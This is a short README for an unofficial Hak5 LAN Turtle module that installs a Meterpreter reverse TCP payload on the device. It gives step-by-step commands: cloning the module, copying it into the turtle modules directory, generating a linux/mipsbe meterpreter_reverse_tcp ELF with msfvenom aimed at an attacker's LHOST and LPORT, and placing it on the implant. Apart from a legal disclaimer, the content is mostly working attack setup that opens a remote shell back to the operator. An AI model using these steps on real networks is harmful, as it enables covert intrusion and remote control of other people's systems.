## Unofficial custom Hak5 LAN Turtle Module - meterpreter-mipsbe-reverse-tcp

#### LEGAL DISCLAMER
    The author does not hold any responsibility for the bad use of this module, remember that attacking
    targets without prior consent is illegal and punished by law. So use this module responsibly.

#### DOWNLOAD/INSTALL

**1 - On LAN Turtle: download module from github**<br />
`git clone https://github.com/ATTACKnDEFEND/LanTurtlemeterpreter-mipsbe-reverse-tcp`

**2 - On LAN Turtle: copy meterpreter-mipsbe-reverse-tcp to Hak5 Turtle modules directory**<br />
`copy meterpreter-mipsbe-reverse-tcp /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
`chmod 755 /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />

**3 - On Kali: generate Meterpreter payload with Msfvenom**<br />
`msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f elf > meterpreter-mipsbe-reverse-tcp`

**4 - On LAN Turtle, transfer Meterpreter payload 
transfer meterpreter-mipsbe-reverse-tcp to /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp<br />
`chmod 755 /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />






